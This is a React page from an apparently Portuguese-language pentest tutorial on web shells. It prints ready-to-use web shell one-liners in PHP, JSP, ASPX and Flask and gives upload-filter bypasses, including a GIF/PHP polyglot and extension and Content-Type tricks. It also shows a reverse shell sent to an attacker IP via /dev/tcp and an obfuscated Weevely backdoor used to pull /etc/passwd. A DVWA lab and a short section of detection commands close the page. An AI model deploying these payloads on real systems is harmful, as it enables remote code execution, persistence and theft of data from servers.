import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function WebShells() {
  return (
    <PageContainer
      title="Web Shells — RCE persistente via web"
      subtitle="Quando você consegue subir um arquivo, ele vira sua porta de entrada. Tipos, evasão e detecção."
      difficulty="intermediário"
      timeToRead="13 min"
      prompt="web/webshells"
    >
      <h2>O conceito</h2>
      <p>
        Uma <strong>web shell</strong> é um script (PHP, ASP, JSP, etc.) hospedado no servidor web
        que aceita comandos via HTTP e os executa. Geralmente vem depois de:
        upload sem validação, LFI to RCE, SQL injection com FILE privilege,
        ou uma exploração que dá escrita em <code>/var/www/html/</code>.
      </p>

      <h2>One-liners clássicos</h2>
      <CodeBlock
        language="php"
        title="webshells minimalistas (1 linha)"
        code={`# PHP (mais comum)
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
<?php eval($_POST['c']); ?>      # mais flexível, recebe PHP

# JSP
<%@ page import="java.util.*,java.io.*"%>
<% Process p = Runtime.getRuntime().exec(request.getParameter("c"));
   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
   String l; while ((l = r.readLine()) != null) out.println(l); %>

# ASPX
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["c"]).WaitForExit(); %>

# Python (Flask malicioso)
@app.route('/x')
def x():
    return os.popen(request.args.get('c')).read()`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "criar e subir o webshell PHP mais simples",
            cmd: "echo '<?php system($_GET[\"c\"]); ?>' > shell.php",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "subir via formulário vulnerável + chamar",
            cmd: "curl 'https://app.local/uploads/shell.php?c=id'",
            out: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
            outType: "error",
          },
          {
            cmd: "curl 'https://app.local/uploads/shell.php?c=cat+/etc/passwd'",
            out: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
            outType: "warning",
          },
        ]}
      />

      <h2>Webshells "completas" prontas no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/webshells/",
            out: `asp     aspx    cfm     jsp     perl    php     python`,
            outType: "info",
          },
          {
            cmd: "ls /usr/share/webshells/php/",
            out: `findsock.c  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php`,
            outType: "default",
          },
          {
            cmd: "head -20 /usr/share/webshells/php/php-reverse-shell.php",
            out: `<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// Configure $ip and $port for your reverse shell handler
//
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';     // CHANGE THIS  
$port = 1234;          // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;`,
            outType: "muted",
          },
        ]}
      />

      <h2>Reverse shell via webshell (boa prática)</h2>
      <p>
        Webshell direta é desconfortável (sem TTY, sem histórico). Use ela só para
        <strong>disparar uma reverse shell</strong> e migrar para um nc/socket completo.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) atacante: listener",
            cmd: "nc -lvnp 4444",
            out: "Listening on 0.0.0.0 4444",
            outType: "info",
          },
          {
            comment: "2) via webshell, dispara reverse bash",
            cmd: `curl 'https://app.local/shell.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.42%2F4444%200%3E%261%22'`,
            out: "(curl trava — porque shell ficou aberta na vítima)",
            outType: "default",
          },
          {
            comment: "3) atacante: shell + estabilização",
            cmd: "(no listener)",
            out: `Connection received on 200.150.10.42 51234
www-data@app:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@app:/var/www/html$ ^Z

stty raw -echo; fg
www-data@app:/var/www/html$ export TERM=xterm-256color`,
            outType: "success",
          },
        ]}
      />

      <h2>Bypass de validação de upload</h2>
      <CommandTable
        title="Validações fracas — todas têm bypass"
        variations={[
          { cmd: "Filtro de extensão lista negra (.php, .asp, .jsp)", desc: "Use variantes: .phtml, .phar, .pht, .php5, .php7.", output: "Apache geralmente executa todos como PHP." },
          { cmd: "Filtro só checa Content-Type do upload", desc: "Edite no Burp para image/png mas envie PHP.", output: "Servidor confia no header." },
          { cmd: "Filtro checa magic bytes (header GIF/PNG)", desc: "Anteceda payload com GIF89a;<?php ...?>", output: "Magic bytes ok + PHP roda mesmo assim." },
          { cmd: "Filtro só roda em extensão final", desc: "shell.php.jpg ou shell.jpg.php (depende do parser).", output: "Apache mod_mime: shell.php.xxx → executa como php." },
          { cmd: "Filtro tira '.php' uma vez", desc: "Use shell.pphphp → após filter vira shell.php.", output: "Recursão fraca." },
          { cmd: "Path traversal no nome", desc: "../../../var/www/html/shell.php.", output: "Sai do diretório de upload." },
          { cmd: "Null byte (PHP < 5.3.4)", desc: "shell.php%00.jpg.", output: "Trunca extensão." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "polyglot GIF + PHP",
            cmd: `printf 'GIF89a\\n<?php system($_GET["c"]); ?>' > shell.php.gif`,
            out: "(arquivo passa em validação de magic bytes)",
            outType: "info",
          },
          {
            cmd: "file shell.php.gif",
            out: "shell.php.gif: GIF image data 10101 x 25966",
            outType: "default",
          },
          {
            comment: "subir via formulário (Burp para mudar Content-Type/extensão)",
            cmd: "curl -F 'foto=@shell.php.gif;filename=shell.php;type=image/gif' https://app.local/upload",
            out: `{"ok": true, "url": "/uploads/shell.php"}`,
            outType: "warning",
          },
          {
            cmd: "curl 'https://app.local/uploads/shell.php?c=id'",
            out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
            outType: "error",
          },
        ]}
      />

      <h2>WeevelyShell — webshell ofuscada</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "weevely generate Senh@123 shell.php",
            out: `[generate.php] Backdoor file 'shell.php' created with password 'Senh@123'`,
            outType: "info",
          },
          {
            cmd: "wc -c shell.php",
            out: `742 shell.php`,
            outType: "default",
          },
          {
            comment: "o conteúdo parece inofensivo",
            cmd: "head shell.php",
            out: `<?php
$E='c'.'o'.'u'.'n'.'t';$d=explode($E('=',1),$_COOKIE);$F='s'.'tr_re'.'p'.'l'.'a'.'c'.'e';$D=$d[1];$g=$F('-','+',$D);$z='cr'.'eate_function';$j=$z('','eval(base64_decode("'.$g.'"));');$j();`,
            outType: "muted",
          },
          {
            comment: "agora controle remoto:",
            cmd: "weevely https://app.local/uploads/shell.php Senh@123",
            out: `[+] weevely 4.0.1
[+] Target:	www-data@app:/var/www/html
[+] Session:	/root/.weevely/sessions/app.local/shell_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> :system_info
+----------------------+--------------------------------+
| client_ip            | 192.168.1.42                   |
| max_execution_time   | 30                             |
| open_basedir         |                                |
| os                   | Linux app 5.15.0-83-generic    |
| php_self             | /uploads/shell.php             |
| safe_mode            |                                |
| script               | /var/www/html/uploads/shell.php|
| whoami               | www-data                       |
+----------------------+--------------------------------+

weevely> :file_download /etc/passwd /tmp/passwd_alvo
[+] file /etc/passwd downloaded to /tmp/passwd_alvo`,
            outType: "success",
          },
        ]}
      />

      <h2>Detecção em servidor (defesa)</h2>
      <CodeBlock
        language="bash"
        title="caça a webshells em /var/www/"
        code={`# Procurar funções perigosas em PHP recém-modificado
find /var/www -type f -name '*.php' -mtime -7 \\
  -exec grep -lE 'eval|system|shell_exec|passthru|base64_decode|str_rot13' {} \\;

# Arquivos com permissão escrita pelo usuário do webserver
find /var/www -type f -writable -name '*.php'

# Arquivos com extensões suspeitas
find /var/www -name '*.phtml' -o -name '*.phar' -o -name '*.pht'

# Padrões classicos
grep -RnE '(eval|assert|create_function|preg_replace.*\\/e)' /var/www/

# Logs recentes apontando para arquivos novos
awk '$9~/^200$/ {print $7}' /var/log/apache2/access.log | sort -u | grep -E 'php|asp|jsp'

# Detecção em runtime
auditctl -w /var/www/html -p wa -k webshell-detect`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "rodar a busca",
            cmd: "find /var/www -name '*.php' -mtime -1 -exec grep -l 'eval\\|system\\|shell_exec' {} \\;",
            out: `/var/www/html/uploads/shell.php
/var/www/html/cache/_2024xx.php`,
            outType: "warning",
          },
          {
            cmd: "ls -la /var/www/html/uploads/shell.php",
            out: "-rw-rw-rw- 1 www-data www-data 742 Apr  3 14:01 shell.php",
            outType: "error",
          },
        ]}
      />

      <PracticeBox
        title="Upload + RCE em DVWA"
        goal="No DVWA File Upload (Low) subir uma webshell PHP e executar id."
        steps={[
          "Crie shell.php com one-liner (echo '<?php system($_GET[\"c\"]); ?>').",
          "DVWA → File Upload, dificuldade Low → upload.",
          "Acesse /hackable/uploads/shell.php?c=id.",
          "Suba para Medium (filtra Content-Type) — modifique Content-Type no Burp.",
          "Suba para High (filtra extensão) — use shell.php.jpg + LFI/.htaccess para forçar parse.",
        ]}
        command={`echo '<?php system($_GET["c"]); ?>' > shell.php

# Low — upload direto
curl -X POST http://localhost:8080/vulnerabilities/upload/ \\
  -b 'PHPSESSID=...; security=low' \\
  -F 'MAX_FILE_SIZE=100000' -F 'uploaded=@shell.php' -F 'Upload=Upload'

curl 'http://localhost:8080/hackable/uploads/shell.php?c=id'

# Medium — Content-Type bypass
curl -X POST http://localhost:8080/vulnerabilities/upload/ \\
  -b 'PHPSESSID=...; security=medium' \\
  -F 'uploaded=@shell.php;type=image/jpeg' -F 'Upload=Upload'

curl 'http://localhost:8080/hackable/uploads/shell.php?c=id'`}
        expected={`uid=33(www-data) gid=33(www-data) groups=33(www-data)`}
        verify="No High, lembrar que o servidor renomeia shell.php.jpg para shell_<hash>.jpg — combine com LFI ou .htaccess customizado."
      />

      <AlertBox type="warning" title="Webshell deixa rastros">
        Em pentest profissional, sempre <strong>delete a webshell</strong> ao final
        ou avise o cliente para fazê-lo. Esquecer arquivos é vetor para outro atacante
        encontrar e usar — e seu nome no log fica como "ponto de entrada" do incidente.
      </AlertBox>
    </PageContainer>
  );
}
